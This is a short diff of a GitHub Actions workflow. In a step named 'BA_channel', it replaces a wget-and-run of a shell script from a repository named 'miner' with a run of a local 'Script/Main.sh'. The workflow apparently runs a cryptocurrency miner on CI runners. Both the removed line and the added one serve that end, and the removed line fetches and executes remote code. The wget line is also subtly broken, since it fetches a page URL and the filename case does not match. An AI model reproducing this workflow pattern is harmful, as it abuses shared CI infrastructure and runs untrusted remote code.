@@ -23,5 +23,4 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: BA_channel
-      run: |
-        wget https://github.com/Bang122/miner/blob/main/Main.sh && sh main.sh
+      run: sh Script/Main.sh
